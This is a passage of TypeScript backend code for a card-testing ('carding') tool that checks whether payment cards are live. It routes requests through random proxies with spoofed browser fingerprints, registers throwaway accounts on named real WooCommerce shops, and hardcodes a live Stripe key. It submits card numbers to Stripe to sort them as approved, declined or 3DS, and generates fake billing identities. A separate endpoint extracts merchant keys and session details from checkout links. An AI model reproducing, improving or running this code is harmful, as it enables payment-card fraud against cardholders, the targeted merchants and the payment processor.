        fpHeaders = { "User-Agent": profile.ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9" };
      }

      const ua = fpHeaders["User-Agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

      const targetSites = [
        {
          name: "vignobledubreuil.com",
          baseUrl: "https://www.vignobledubreuil.com",
          accountPath: "/mon-compte/",
          addPaymentPath: "/mon-compte/ajouter-un-moyen-de-paiement/",
          registerNonceKey: 'woocommerce-register-nonce" value="',
          setupNonceKey: '"createAndConfirmSetupIntentNonce":"',
          ajaxAction: "wc_stripe_create_and_confirm_setup_intent",
          country: "FR",
          currency: "eur",
          pkLive: "pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ",
        },
        {
          name: "redbluechair.com",
          baseUrl: "https://redbluechair.com",
          accountPath: "/my-account/",
          addPaymentPath: "/my-account/add-payment-method/",
          registerNonceKey: 'woocommerce-register-nonce" value="',
          setupNonceKey: '"createSetupIntentNonce"',
          ajaxAction: "create_setup_intent",
          country: "US",
          currency: "usd",
          pkLive: "",
        },
      ];

      const site = siteUrl
        ? targetSites.find(s => siteUrl.includes(s.name)) || targetSites[0]
        : targetSites[0];

      const browseHeaders: Record<string, string> = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": fpHeaders["Accept-Language"] || "en-US,en;q=0.9",
        "User-Agent": ua,
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
      };

      // Step 1: GET account page to get register nonce
      const step1 = await proxyRequest(`${site.baseUrl}${site.accountPath}`, {
        method: "GET",
        headers: browseHeaders,
        proxyUrl,
        timeout: 30000,
      });

      const regNonceMatch = step1.body.match(/woocommerce-register-nonce"\s*value="([^"]+)"/);
      const registerMatch = step1.body.match(/register"\s*value="([^"]+)"/);
      if (!regNonceMatch) {
        return res.json({ card: data, status: "ERROR", message: "Cannot get register nonce from site", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
      }

      const wooNonce = regNonceMatch[1];
      const registerVal = registerMatch ? registerMatch[1] : "Register";

      // Step 2: Register random account
      const randEmail = Array.from({ length: 10 }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("") + "@gmail.com";
      const timeStr = new Date().toISOString().replace("T", " ").substring(0, 19);

      const regData: Record<string, string> = {
        email: randEmail,
        wc_order_attribution_source_type: "typein",
        wc_order_attribution_referrer: "(none)",
        wc_order_attribution_utm_campaign: "(none)",
        wc_order_attribution_utm_source: "(direct)",
        wc_order_attribution_utm_medium: "(none)",
        wc_order_attribution_utm_content: "(none)",
        wc_order_attribution_utm_id: "(none)",
        wc_order_attribution_utm_term: "(none)",
        wc_order_attribution_utm_source_platform: "(none)",
        wc_order_attribution_utm_creative_format: "(none)",
        wc_order_attribution_utm_marketing_tactic: "(none)",
        wc_order_attribution_session_entry: `${site.baseUrl}/`,
        wc_order_attribution_session_start_time: timeStr,
        wc_order_attribution_session_pages: "4",
        wc_order_attribution_session_count: "1",
        wc_order_attribution_user_agent: ua,
        "woocommerce-register-nonce": wooNonce,
        _wp_http_referer: site.accountPath,
        register: registerVal,
      };

      const regBody = new URLSearchParams(regData).toString();

      const step2 = await proxyRequest(`${site.baseUrl}${site.accountPath}`, {
        method: "POST",
        headers: { ...browseHeaders, "Content-Type": "application/x-www-form-urlencoded" },
        body: regBody,
        proxyUrl,
        timeout: 30000,
      });

      // Extract cookies from registration response (look for set-cookie in response)
      // In our proxy wrapper we don't track cookies, so we re-GET the add-payment page
      // The session might be set server-side — we pass along the registration

      // Step 3: GET add-payment-method page to get setup intent nonce + pk_live
      const step3 = await proxyRequest(`${site.baseUrl}${site.addPaymentPath}`, {
        method: "GET",
        headers: browseHeaders,
        proxyUrl,
        timeout: 30000,
      });

      let setupNonce = "";
      const setupNonceMatch1 = step3.body.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
      const setupNonceMatch2 = step3.body.match(/"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"/);
      setupNonce = (setupNonceMatch1?.[1] || setupNonceMatch2?.[1]) || "";

      let pkLive = site.pkLive;
      if (!pkLive) {
        const pkMatch = step3.body.match(/pk_live_[a-zA-Z0-9]+/);
        if (pkMatch) pkLive = pkMatch[0];
      }

      if (!setupNonce) {
        return res.json({ card: data, status: "ERROR", message: "Cannot get setup intent nonce (session may not have persisted)", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
      }

      if (!pkLive) {
        return res.json({ card: data, status: "ERROR", message: "Cannot find Stripe publishable key", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
      }

      // Step 4: GET Stripe elements/sessions to get config_id
      const stripeSessionUrl = `https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=${site.currency}&deferred_intent[payment_method_types][0]=card&deferred_intent[setup_future_usage]=off_session&currency=${site.currency}&key=${pkLive}&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=${site.name}`;

      const stripeHeaders: Record<string, string> = {
        "Accept": "application/json",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "User-Agent": ua,
      };

      const step4 = await proxyRequest(stripeSessionUrl, {
        method: "GET",
        headers: stripeHeaders,
        proxyUrl,
        timeout: 20000,
      });

      let configId = "";
      try {
        const stripeJson = JSON.parse(step4.body);
        configId = stripeJson.config_id || "";
        if (!configId) {
          const errMsg = stripeJson.error?.message || "";
          return res.json({ card: data, status: "ERROR", message: errMsg || "Cannot get Stripe config_id", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
        }
      } catch {
        return res.json({ card: data, status: "ERROR", message: "Invalid Stripe session response", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
      }

      // Step 5: Create payment method
      const muid = crypto.randomUUID() + randomHex(6);
      const sid = crypto.randomUUID() + randomHex(6);
      const guid = crypto.randomUUID() + randomHex(6);
      const timeOnPage = Math.floor(Math.random() * 30000) + 30000;

      const pmData = new URLSearchParams({
        type: "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        allow_redisplay: "unspecified",
        "billing_details[address][country]": site.country,
        pasted_fields: "number",
        payment_user_agent: "stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; payment-element; deferred-intent",
        referrer: `${site.baseUrl}`,
        time_on_page: String(timeOnPage),
        "client_attribution_metadata[client_session_id]": crypto.randomUUID(),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": configId,
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        guid,
        muid,
        sid,
        key: pkLive,
        _stripe_version: "2024-06-20",
      }).toString();

      const step5 = await proxyRequest("https://api.stripe.com/v1/payment_methods", {
        method: "POST",
        headers: { ...stripeHeaders, "Content-Type": "application/x-www-form-urlencoded" },
        body: pmData,
        proxyUrl,
        timeout: 20000,
      });

      let pmId = "";
      try {
        const pmJson = JSON.parse(step5.body);
        if (pmJson.error) {
          const errMsg = pmJson.error.message || "Payment method creation failed";
          const isDecline = errMsg.toLowerCase().includes("declined") || errMsg.toLowerCase().includes("invalid") || errMsg.toLowerCase().includes("incorrect");
          return res.json({
            card: data,
            status: isDecline ? "DECLINED" : "ERROR",
            message: errMsg,
            approved: false,
            gateway: "Stripe Auth",
            time: ((Date.now() - startTime) / 1000).toFixed(2),
            fingerprint: fpMeta || undefined,
          });
        }
        pmId = pmJson.id || "";
      } catch {
        return res.json({ card: data, status: "ERROR", message: "Invalid PM response", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
      }

      if (!pmId) {
        return res.json({ card: data, status: "ERROR", message: "No payment method ID returned", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
      }

      // Step 6: Confirm setup intent via WP admin-ajax
      const ajaxHeaders: Record<string, string> = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": site.baseUrl,
        "Referer": `${site.baseUrl}${site.addPaymentPath}`,
        "User-Agent": ua,
        "X-Requested-With": "XMLHttpRequest",
      };

      const ajaxData = new URLSearchParams({
        action: site.ajaxAction,
        "wc-stripe-payment-method": pmId,
        "wc-stripe-payment-type": "card",
        _ajax_nonce: setupNonce,
      }).toString();

      const step6 = await proxyRequest(`${site.baseUrl}/wp-admin/admin-ajax.php`, {
        method: "POST",
        headers: ajaxHeaders,
        body: ajaxData,
        proxyUrl,
        timeout: 30000,
      });

      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
      const authIpInfo = await authIpPromise;

      try {
        const finalJson = JSON.parse(step6.body);

        if (finalJson.success === true) {
          const statusVal = finalJson.data?.status || "";
          const responseMsg = finalJson.data?.message || finalJson.data?.redirect_url || statusVal || "";

          if (statusVal === "succeeded") {
            return res.json({ card: data, status: "APPROVED", message: responseMsg || "Approved - Card is Live", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
          } else if (statusVal === "requires_action") {
            return res.json({ card: data, status: "3DS", message: responseMsg || "3DS Required", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
          } else {
            return res.json({ card: data, status: "DECLINED", message: responseMsg || statusVal || "Declined", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
          }
        } else {
          const errMsg = finalJson.data?.error?.message || "Unknown error";
          const isDecline = errMsg.toLowerCase().includes("declined");
          return res.json({ card: data, status: isDecline ? "DECLINED" : "ERROR", message: errMsg, approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
        }
      } catch {
        return res.json({ card: data, status: "ERROR", message: "Invalid response from merchant", gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
      }
    } catch (err: any) {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
      const msg = err.message || "Request failed";
      const cardStr = req.body?.data || "";
      const isDecline = msg.toLowerCase().includes("declined") || (msg.toLowerCase().includes("card") && msg.toLowerCase().includes("invalid"));
      return res.json({ card: cardStr, status: isDecline ? "DECLINED" : "ERROR", message: msg, approved: false, gateway: "Stripe Auth", time: elapsed });
    }
  });

  // ==================== STRIPE CHECKOUT GRAB (Extract session details) ====================
  app.post("/api/stripe-checkout/grab", async (req, res) => {
    try {
      const { checkoutUrl } = req.body;
      if (!checkoutUrl || typeof checkoutUrl !== "string") {
        return res.status(400).json({ success: false, message: "Missing checkout URL" });
      }

      // Allow checkout.stripe.com, buy.stripe.com, and custom Stripe checkout domains
      const isStripeCheckout = checkoutUrl.includes("/c/pay/cs_live_") || checkoutUrl.includes("buy.stripe.com") || checkoutUrl.includes("checkout.stripe.com");
      if (!isStripeCheckout) {
        return res.status(400).json({ success: false, message: "URL must be a Stripe checkout link (buy.stripe.com, checkout.stripe.com, or custom checkout domain with /c/pay/cs_live_)" });
      }

      const proxy = getRandomProxy();
      const proxyUrl = proxy?.url;
      const profile = generateDeviceProfile();
      const ua = profile.ua;

      let pkLive = "";
      let csLive = "";
      let amount = "";
      let currency = "";
      let email = "";
      let merchantName = "";
      let merchantCountry = "";
      let merchantId = "";
      let merchantLogo = "";
      let paymentMethods: string[] = [];
      let cardNetworks: string[] = [];
      let lineItems: { name: string; amount: number; quantity: number }[] = [];

      // Extract cs_live from URL path
      const urlCsMatch = checkoutUrl.match(/cs_live_[A-Za-z0-9_]+/);
      if (urlCsMatch) csLive = urlCsMatch[0];

      // Decode XOR-5 encoded hash fragment for pk_live
      const hashFragment = checkoutUrl.split("#")[1];
      if (hashFragment) {
        try {
          const decoded = decodeURIComponent(hashFragment);
          const buf = Buffer.from(decoded, "base64");
          const xorDecoded = Buffer.from(buf.map((b: number) => b ^ 5)).toString();
          if (xorDecoded.includes("{")) {
            try {
              const hashData = JSON.parse(xorDecoded);
              if (hashData.apiKey) pkLive = hashData.apiKey;
            } catch {}
            if (!pkLive) {
              const pkInHash = xorDecoded.match(/pk_live_[A-Za-z0-9]+/);
              if (pkInHash) pkLive = pkInHash[0];
            }
          }
        } catch {}
      }

      // Step 1: GET the page to extract pk_live if not from hash
      if (!pkLive) {
        try {
          const step1 = await proxyRequest(checkoutUrl.split("#")[0], {
            method: "GET",
            headers: { "Accept": "text/html", "User-Agent": ua, "Upgrade-Insecure-Requests": "1" },
            proxyUrl,
            timeout: 30000,
          });
          const pkMatch = step1.body.match(/pk_live_[A-Za-z0-9]+/);
          if (pkMatch) pkLive = pkMatch[0];
          if (!csLive) {
            const csMatch = step1.body.match(/cs_live_[A-Za-z0-9_]+/);
            if (csMatch) csLive = csMatch[0];
          }
        } catch {}
      }

      // Step 2: For buy.stripe.com links, try merchant-ui-api
      if (checkoutUrl.includes("buy.stripe.com")) {
        const linkId = checkoutUrl.replace(/\/$/, "").split("/").pop() || "";
        try {
          const merchantBody = new URLSearchParams({
            eid: "NA", browser_locale: "en-US", browser_timezone: "America/New_York", referrer_origin: checkoutUrl,
          }).toString();
          const step2 = await proxyRequest(`https://merchant-ui-api.stripe.com/payment-links/${linkId}`, {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://buy.stripe.com", "Referer": "https://buy.stripe.com/", "User-Agent": ua },
            body: merchantBody, proxyUrl, timeout: 20000,
          });
          const plData = JSON.parse(step2.body);
          if (!csLive && plData.session_id) csLive = plData.session_id;
          if (!pkLive && plData.pk) pkLive = plData.pk;
        } catch {}
      }

      if (!csLive && !pkLive) {
        return res.json({ success: false, message: "Could not extract session details from this URL. It may be expired or invalid." });
      }

      // Step 3: Use payment_pages/init — the primary data source for amount, currency, email, line items
      const grabIsBuyLink = checkoutUrl.includes("buy.stripe.com");
      const grabOrigin = grabIsBuyLink ? "https://buy.stripe.com" : "https://checkout.stripe.com";
      if (pkLive && csLive) {
        try {
          const initBody = new URLSearchParams({
            eid: "NA", key: pkLive, browser_locale: "en-US", browser_timezone: "America/New_York",
          }).toString();
          const initResp = await proxyRequest(`https://api.stripe.com/v1/payment_pages/${csLive}/init`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded", "Origin": grabOrigin, "Referer": grabOrigin + "/", "User-Agent": ua },
            body: initBody, proxyUrl, timeout: 25000,
          });
          const initData = JSON.parse(initResp.body);
          if (!initData.error) {
            if (initData.currency) currency = initData.currency;
            if (initData.customer_email) email = initData.customer_email;
            if (initData.account_settings?.account_id) merchantId = initData.account_settings.account_id;
            if (initData.account_settings?.assets?.icon) merchantLogo = initData.account_settings.assets.icon;
            if (initData.geocoding?.country_code) merchantCountry = initData.geocoding.country_code;
            if (initData.ordered_payment_method_types) paymentMethods = initData.ordered_payment_method_types;
            if (initData.account_settings?.display_name) merchantName = initData.account_settings.display_name;
            if (initData.account_settings?.country) merchantCountry = initData.account_settings.country || merchantCountry;
            if (initData.line_item_group) {
              const lig = initData.line_item_group;
              amount = String(lig.due || lig.total || lig.subtotal || "");
              currency = lig.currency || currency;
              if (lig.line_items?.length) {
                lineItems = lig.line_items.map((li: any) => ({
                  name: li.name || li.description || "",
                  amount: li.total || li.subtotal || li.price?.unit_amount || 0,
                  quantity: li.quantity || 1,
                  currency: li.price?.currency || currency,
                }));
              }
            }
            if (!amount && initData.invoice) {
              const inv = initData.invoice;
              if (initData.adaptive_pricing_info) {
                const api = initData.adaptive_pricing_info;
                const intCurrency = api.integration_currency || "";
                const altOpts = api.alternative_currency_options || [];
                const intOpt = altOpts.find((o: any) => o.currency === intCurrency);
                if (intOpt) {
                  amount = String(intOpt.total);
                  currency = intCurrency;
                } else {
                  amount = String(inv.amount_due || inv.total || inv.subtotal || "");
                  if (inv.currency) currency = inv.currency;
                }
              } else {
                amount = String(inv.amount_due || inv.total || inv.subtotal || "");
                if (inv.currency) currency = inv.currency;
              }
              if (inv.lines?.data?.length) {
                lineItems = inv.lines.data.map((li: any) => ({
                  name: li.price?.product?.name || li.description || "",
                  amount: li.amount || li.price?.unit_amount || 0,
                  quantity: li.quantity || 1,
                  currency: li.currency || currency,
                }));
              }
            }
            if (!amount && initData.adaptive_pricing_info) {
              const api = initData.adaptive_pricing_info;
              const intCurrency = api.integration_currency || "";
              const altOpts = api.alternative_currency_options || [];
              const intOpt = altOpts.find((o: any) => o.currency === intCurrency);
              if (intOpt) {
                amount = String(intOpt.total);
                currency = intCurrency;
              }
            }
          }
        } catch {}
      }

      // Step 4: Use elements/sessions for merchant name, card networks
      if (pkLive && csLive) {
        try {
          const esParams = new URLSearchParams({
            type: "deferred_intent", checkout_session_id: csLive,
            "deferred_intent[mode]": "payment", "deferred_intent[amount]": amount || "100",
            "deferred_intent[currency]": currency || "usd", "deferred_intent[payment_method_types][0]": "card",
            key: pkLive,
          }).toString();
          const esResp = await proxyRequest(`https://api.stripe.com/v1/elements/sessions?${esParams}`, {
            method: "GET",
            headers: { "Accept": "application/json", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "User-Agent": ua },
            proxyUrl, timeout: 20000,
          });
          const esData = JSON.parse(esResp.body);
          if (esData.business_name) merchantName = esData.business_name;
          if (!merchantCountry && esData.merchant_country) merchantCountry = esData.merchant_country;
          if (!merchantId && esData.merchant_id) merchantId = esData.merchant_id;
          if (esData.capability_enabled_card_networks) cardNetworks = esData.capability_enabled_card_networks;
          if (!paymentMethods.length && esData.ordered_payment_method_types_and_wallets) paymentMethods = esData.ordered_payment_method_types_and_wallets;
        } catch {}
      }

      return res.json({
        success: true,
        csLive: csLive || "",
        pkLive: pkLive || "",
        amount: amount || "",
        currency: currency || "",
        email: email || "",
        merchantName: merchantName || "",
        merchantCountry,
        merchantId,
        merchantLogo,
        paymentMethods,
        cardNetworks,
        lineItems,
      });
    } catch (err: any) {
      return res.json({ success: false, message: err.message || "Failed to grab checkout details" });
    }
  });

  // ==================== STRIPE CHECKOUT (Payment Link Hitter) ====================
  app.post("/api/stripe-checkout", async (req, res) => {
    const startTime = Date.now();
    try {
      const { data, checkoutUrl, currencyOverride } = req.body;
      if (!data || typeof data !== "string") {
        return res.status(400).json({ status: "ERROR", message: "Missing card data" });
      }
      if (!checkoutUrl || typeof checkoutUrl !== "string") {
        return res.status(400).json({ status: "ERROR", message: "Missing checkout URL (buy.stripe.com or checkout.stripe.com link)" });
      }

      const isStripeCheckout = checkoutUrl.includes("/c/pay/cs_live_") || checkoutUrl.includes("buy.stripe.com") || checkoutUrl.includes("checkout.stripe.com");
      if (!isStripeCheckout) {
        return res.status(400).json({ status: "ERROR", message: "Checkout URL must be a Stripe checkout link" });
      }

      const parts = data.split("|");
      if (parts.length < 4) {
        return res.status(400).json({ status: "ERROR", message: "Invalid format. Use cc|mm|yy|cvv" });
      }

      const cc = parts[0].replace(/\s/g, "");
      const mm = parts[1].trim().padStart(2, "0");
      const yy = parts[2].trim().slice(-2);
      const cvv = parts[3].trim();

      const proxy = getRandomProxy();
      const proxyUrl = proxy?.url;
      const proxyCountry = resolveProxyCountry(proxy);

      let fpMeta: Record<string, string> | null = null;
      let ua: string;
      if (fingerprintEnabled) {
        const fp = generateAdvancedFingerprint(proxyCountry);
        fpMeta = fp.meta;
        ua = fp.headers["User-Agent"];
      } else {
        const profile = generateDeviceProfile();
        ua = profile.ua;
      }

      // Extract payment link ID from URL
      const linkId = checkoutUrl.replace(/\/$/, "").split("/").pop() || "";

      // Step 1: GET the buy page to extract pk_live, cs_live
      const buyHeaders: Record<string, string> = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": ua,
        "Upgrade-Insecure-Requests": "1",
      };

      const step1 = await proxyRequest(checkoutUrl, {
        method: "GET",
        headers: buyHeaders,
        proxyUrl,
        timeout: 30000,
      });

      let pkLive = "";
      let csLive = "";
      const pkMatch = step1.body.match(/pk_live_[A-Za-z0-9]+/);
      const csMatch = step1.body.match(/cs_live_[A-Za-z0-9_]+/);
      if (pkMatch) pkLive = pkMatch[0];
      if (csMatch) csLive = csMatch[0];

      // Try cs_live from URL path
      if (!csLive) {
        const urlCsMatch = checkoutUrl.match(/cs_live_[A-Za-z0-9_]+/);
        if (urlCsMatch) csLive = urlCsMatch[0];
      }

      // Decode XOR-5 encoded hash fragment from checkout.stripe.com URLs
      const checkoutHash = checkoutUrl.split("#")[1];
      if (checkoutHash) {
        try {
          const decoded = decodeURIComponent(checkoutHash);
          const buf = Buffer.from(decoded, "base64");
          const xorDecoded = Buffer.from(buf.map((b: number) => b ^ 5)).toString();
          if (xorDecoded.includes("{")) {
            try {
              const hashData = JSON.parse(xorDecoded);
              if (hashData.apiKey && !pkLive) pkLive = hashData.apiKey;
            } catch {}
            const pkInHash = xorDecoded.match(/pk_live_[A-Za-z0-9]+/);
            if (pkInHash && !pkLive) pkLive = pkInHash[0];
          }
        } catch {}
      }

      let sessionId = csLive;
      let configId = "";
      let initChecksum = "";
      let expectedAmount = "";
      let lineItemId = "";
      let currency = currencyOverride || "usd";
      let siteKey = "";

      const ipInfoPromise = fetchIpLocation(proxyUrl);

      // Step 2: Use payment_pages/init as the primary source (works for all checkout URLs)
      const isBuyLinkInit = checkoutUrl.includes("buy.stripe.com");
      const initOrigin = isBuyLinkInit ? "https://buy.stripe.com" : "https://checkout.stripe.com";
      if (pkLive && sessionId) {
        try {
          const initBody = new URLSearchParams({
            eid: "NA", key: pkLive, browser_locale: "en-US", browser_timezone: "America/New_York",
          }).toString();
          const initResp = await proxyRequest(`https://api.stripe.com/v1/payment_pages/${sessionId}/init`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded", "Origin": initOrigin, "Referer": initOrigin + "/", "User-Agent": ua },
            body: initBody, proxyUrl, timeout: 25000,
          });
          const initData = JSON.parse(initResp.body);
          if (!initData.error) {
            configId = initData.config_id || "";
            initChecksum = initData.init_checksum || "";
            if (!currencyOverride) currency = initData.currency || currency;
            siteKey = initData.site_key || "";
            if (initData.line_item_group) {
              const lig = initData.line_item_group;
              expectedAmount = String(lig.due || lig.total || lig.subtotal || "");
              if (!currencyOverride) currency = lig.currency || currency;
              const items = lig.line_items || [];
              if (items.length > 0) lineItemId = items[0].id || "";
            }
            if (!expectedAmount && initData.invoice) {
              const inv = initData.invoice;
              expectedAmount = String(inv.amount_due || inv.total || inv.subtotal || "");
              if (!currencyOverride && inv.currency) currency = inv.currency;
            }
            if (!expectedAmount && initData.adaptive_pricing_info) {
              const api = initData.adaptive_pricing_info;
              const intCurrency = api.integration_currency || "";
              const altOpts = api.alternative_currency_options || [];
              const intOpt = altOpts.find((o: any) => o.currency === intCurrency);
              if (intOpt) {
                expectedAmount = String(intOpt.total);
                if (!currencyOverride) currency = intCurrency;
              }
            }
          }
        } catch {}
      }

      // Fallback: Try merchant-ui-api for buy.stripe.com links if init didn't work
      if ((!configId || !expectedAmount) && checkoutUrl.includes("buy.stripe.com")) {
        const linkId = checkoutUrl.replace(/\/$/, "").split("/").pop() || "";
        try {
          const merchantBody = new URLSearchParams({
            eid: "NA", browser_locale: "en-US", browser_timezone: "America/New_York", referrer_origin: checkoutUrl,
          }).toString();
          const step2 = await proxyRequest(`https://merchant-ui-api.stripe.com/payment-links/${linkId}`, {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://buy.stripe.com", "Referer": "https://buy.stripe.com/", "User-Agent": ua },
            body: merchantBody, proxyUrl, timeout: 20000,
          });
          const plData = JSON.parse(step2.body);
          sessionId = plData.session_id || sessionId;
          if (!configId) configId = plData.config_id || "";
          if (!initChecksum) initChecksum = plData.init_checksum || "";
          if (!currencyOverride && (!currency || currency === "usd")) currency = plData.currency || currency;
          if (!siteKey) siteKey = plData.site_key || "";
          if (!expectedAmount) {
            const lig = plData.line_item_group || {};
            expectedAmount = String(lig.total || lig.due || lig.subtotal || "");
            const items = lig.line_items || [];
            if (items.length > 0 && !lineItemId) lineItemId = items[0].id || "";
          }
          if (!pkLive && plData.pk) pkLive = plData.pk;
        } catch {}
      }

      const ipInfo = await ipInfoPromise;

      if (!pkLive) {
        return res.json({ card: data, status: "ERROR", message: "Cannot extract Stripe publishable key from checkout page", gateway: "Stripe Checkout", time: ((Date.now() - startTime) / 1000).toFixed(2), ipInfo });
      }
      if (!sessionId) {
        return res.json({ card: data, status: "ERROR", message: "Cannot extract checkout session ID", gateway: "Stripe Checkout", time: ((Date.now() - startTime) / 1000).toFixed(2), ipInfo });
      }

      // Step 3: GET elements/sessions for config_id
      const stripeJsId = crypto.randomUUID();
      const stripeHeaders: Record<string, string> = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "User-Agent": ua,
      };

      if (!configId) {
        const esParams = new URLSearchParams({
          "deferred_intent[mode]": "payment",
          "deferred_intent[amount]": expectedAmount || "100",
          "deferred_intent[currency]": currency,
          "deferred_intent[payment_method_types][0]": "card",
          currency,
          key: pkLive,
          hosted_surface: "checkout",
          type: "deferred_intent",
          checkout_session_id: sessionId,
        }).toString();

        try {
          const step3 = await proxyRequest(`https://api.stripe.com/v1/elements/sessions?${esParams}`, {
            method: "GET", headers: stripeHeaders, proxyUrl, timeout: 10000,
          });
          const esData = JSON.parse(step3.body);
          if (!configId) configId = esData.config_id || "";
        } catch {}
      }

      if (!expectedAmount) expectedAmount = "100";

      // Step 4: Create payment method
      const muid = crypto.randomUUID();
      const guid = crypto.randomUUID();
      const sid = crypto.randomUUID();
      const addr = generateRandomAddress(currency);
      const randEmail = `${addr.name.toLowerCase().replace(/\s/g, ".")}${Math.floor(Math.random() * 999)}@gmail.com`;

      const pmFormData = new URLSearchParams({
        type: "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "billing_details[name]": addr.name,
        "billing_details[email]": randEmail,
        "billing_details[phone]": addr.phone,
        "billing_details[address][line1]": addr.line1,
        "billing_details[address][city]": addr.city,
        "billing_details[address][state]": addr.state,
        "billing_details[address][postal_code]": addr.postal_code,
        "billing_details[address][country]": addr.country,
        guid,
        muid,
        sid,
        key: pkLive,
        payment_user_agent: "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
        "client_attribution_metadata[client_session_id]": stripeJsId,
        "client_attribution_metadata[checkout_session_id]": sessionId,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "payment_link",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        "client_attribution_metadata[checkout_config_id]": configId || "",
      }).toString();

      const isBuyLink = checkoutUrl.includes("buy.stripe.com");
      const checkoutOrigin = isBuyLink ? "https://buy.stripe.com" : "https://checkout.stripe.com";
      const buyStripeHeaders: Record<string, string> = {
        ...stripeHeaders,
        "Origin": checkoutOrigin,
        "Referer": checkoutOrigin + "/",
      };

      const step4 = await proxyRequest("https://api.stripe.com/v1/payment_methods", {
        method: "POST",
        headers: buyStripeHeaders,
        body: pmFormData,
        proxyUrl,
        timeout: 20000,
      });

      let pmId = "";
      try {
        const pmJson = JSON.parse(step4.body);
        if (pmJson.error) {
          const errMsg = pmJson.error.message || "Payment method creation failed";
          const isDecline = errMsg.toLowerCase().includes("declined") || errMsg.toLowerCase().includes("invalid") || errMsg.toLowerCase().includes("incorrect");
          return res.json({
            card: data,
            status: isDecline ? "DECLINED" : "ERROR",
            message: errMsg,
            approved: false,
            gateway: "Stripe Checkout",
            time: ((Date.now() - startTime) / 1000).toFixed(2),
            fingerprint: fpMeta || undefined,
            ipInfo,
          });
        }
        pmId = pmJson.id || "";
      } catch {
        return res.json({ card: data, status: "ERROR", message: "Invalid PM response", gateway: "Stripe Checkout", time: ((Date.now() - startTime) / 1000).toFixed(2), ipInfo });
      }

      if (!pmId) {
        return res.json({ card: data, status: "ERROR", message: "No payment method ID", gateway: "Stripe Checkout", time: ((Date.now() - startTime) / 1000).toFixed(2), ipInfo });
      }

      // Step 5: Confirm payment on payment_pages
      const pxvid = crypto.randomUUID();
      const jsChecksum = randomHex(50);
      const rvTimestamp = randomHex(120);

      const confirmParams: Record<string, string> = {
        eid: "NA",
        payment_method: pmId,
        expected_amount: expectedAmount,
        "last_displayed_line_item_group_details[subtotal]": expectedAmount,
        "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
        "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
        "last_displayed_line_item_group_details[total_discount_amount]": "0",
        "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
        "customer_data[name]": addr.name,
        "customer_data[email]": randEmail,
        "customer_data[phone]": addr.phone,
        "customer_data[address][line1]": addr.line1,
        "customer_data[address][city]": addr.city,
        "customer_data[address][state]": addr.state,
        "customer_data[address][postal_code]": addr.postal_code,
        "customer_data[address][country]": addr.country,
        expected_payment_method_type: "card",
        guid,
        muid,
        sid,
        key: pkLive,
        version: "148043f9d7",
